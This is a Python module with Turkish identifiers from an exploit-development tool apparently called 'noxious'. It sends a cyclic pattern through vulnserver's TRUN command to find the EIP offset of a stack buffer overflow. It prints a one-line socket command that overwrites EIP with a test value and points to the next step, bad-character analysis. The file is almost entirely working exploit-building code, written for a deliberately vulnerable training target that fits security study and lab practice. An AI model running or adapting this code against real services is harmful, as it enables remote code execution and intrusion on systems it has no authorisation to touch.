#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious offset bulucu modülü - eip offset tespiti için döngüsel desen gönderimi
"""

from typing import Optional

from cekirdek.gunluk import Gunluk
from cekirdek.baglanti import BaglantiYoneticisi, BaglantiHatasi
from cekirdek.yardimcilar import desen_olustur, desen_bul


def offset_tespiti_baslat(
    hedef_ip: str,
    hedef_port: int,
    desen_uzunlugu: int = 3000,
    komut: str = "TRUN",
    eip_degeri: Optional[str] = None,
    zaman_asimi: float = 5.0,
    gunluk: Optional[Gunluk] = None,
) -> Optional[int]:
    """
    eip offset tespiti için benzersiz döngüsel desen gönderir

    süreç:
        1. belirtilen uzunlukta benzersiz döngüsel desen üretir
        2. deseni hedef servise gönderir
        3. eip değeri verilmişse otomatik offset hesaplar

    parametreler:
        hedef_ip: hedef sunucu ip adresi
        hedef_port: hedef sunucu port numarası
        desen_uzunlugu: üretilecek desen uzunluğu
        komut: vulnserver komutu
        eip_degeri: debugger'dan alınan eip hex değeri (ör: "386F4337")
        zaman_asimi: bağlantı zaman aşımı
        gunluk: loglama nesnesi

    döndürür:
        hesaplanan offset değeri veya none
    """
    log = gunluk or Gunluk()

    log.baslik("offset tespiti")
    log.bilgi(f"hedef          : {hedef_ip}:{hedef_port}")
    log.bilgi(f"komut          : {komut}")
    log.bilgi(f"desen uzunluğu : {desen_uzunlugu} karakter")
    log.bos_satir()

    # döngüsel desen üret
    log.bilgi("döngüsel desen üretiliyor...")
    desen = desen_olustur(desen_uzunlugu)
    log.basari(f"desen üretildi ({len(desen)} karakter)")
    log.ayiklama(f"desen başlangıcı: {desen[:50]}...")

    # payload oluştur
    payload = f"{komut} /.:/".encode("latin-1") + desen.encode("latin-1")
    log.bilgi(f"toplam payload boyutu: {len(payload)} byte")
    log.bos_satir()

    # hedef erişilebilirlik kontrolü
    baglanti = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
    if not baglanti.hedef_eriselebilir_mi():
        log.hata(f"hedef erişilemiyor: {hedef_ip}:{hedef_port}")
        return None

    # deseni gönder
    log.bilgi("desen hedef servise gönderiliyor...")

    try:
        gonderici = BaglantiYoneticisi(hedef_ip, hedef_port, zaman_asimi, log)
        gonderici.baglan_ve_gonder(payload, deneme_sayisi=1)
        log.basari("desen başarıyla gönderildi")
    except BaglantiHatasi as hata:
        log.hata(f"gönderim başarısız: {hata}")
        return None

    log.bos_satir()

    # eip değeri verilmişse offset hesapla
    if eip_degeri:
        log.bilgi(f"eip değeri ile offset hesaplanıyor: 0x{eip_degeri}")
        try:
            offset = desen_bul(eip_degeri, desen)
            log.basari(f"kesin offset bulundu: {offset}")
            log.bos_satir()
            log.bilgi("doğrulama komutu:")
            log.bilgi(
                f"  eip'yi 42424242 (BBBB) ile üzerine yazarak doğrulayın:"
            )
            log.bilgi(
                f'  python3 -c "import socket; s=socket.socket(); '
                f"s.connect(('{hedef_ip}',{hedef_port})); "
                f"s.send(b'{komut} /.:/'"
                f" + b'A'*{offset} + b'BBBB'); s.close()\""
            )
            log.bos_satir()
            log.bilgi("sonraki adım: kötü karakter analizi")
            log.bilgi(
                f"  python3 noxious.py karakter --hedef {hedef_ip} "
                f"--port {hedef_port} --offset {offset}"
            )
            return offset
        except ValueError as hata:
            log.hata(f"offset hesaplanamadı: {hata}")
            return None
    else:
        log.uyari("eip değeri belirtilmedi, sadece desen gönderildi")
        log.bos_satir()
        log.bilgi("yapmanız gerekenler:")
        log.bilgi("  1. debugger'da (immunity/x64dbg) eip register değerini not edin")
        log.bilgi("  2. aşağıdaki komutu çalıştırın:")
        log.bilgi(
            f"     python3 noxious.py offset --hedef {hedef_ip} "
            f"--port {hedef_port} --uzunluk {desen_uzunlugu} "
            f"--eip <EIP_DEGERI>"
        )
        log.bos_satir()
        log.bilgi("alternatif olarak msf-pattern_offset kullanabilirsiniz:")
        log.bilgi(
            f"  msf-pattern_offset -l {desen_uzunlugu} -q <EIP_DEGERI>"
        )
        return None


def offset_hesapla(
    eip_degeri: str,
    desen_uzunlugu: int = 20000,
    gunluk: Optional[Gunluk] = None,
) -> Optional[int]:
    """
    desen göndermeden sadece offset hesaplar (çevrimdışı mod)

    parametreler:
        eip_degeri: debugger'dan alınan eip hex değeri
        desen_uzunlugu: üretilecek desen uzunluğu
        gunluk: loglama nesnesi

    döndürür:
        hesaplanan offset değeri
    """
    log = gunluk or Gunluk()

    log.baslik("çevrimdışı offset hesaplama")
    log.bilgi(f"eip değeri     : 0x{eip_degeri}")
    log.bilgi(f"desen uzunluğu : {desen_uzunlugu}")
    log.bos_satir()

    try:
        desen = desen_olustur(desen_uzunlugu)
        offset = desen_bul(eip_degeri, desen)
        log.basari(f"offset bulundu: {offset}")
        return offset
    except ValueError as hata:
        log.hata(f"offset hesaplanamadı: {hata}")
        return None
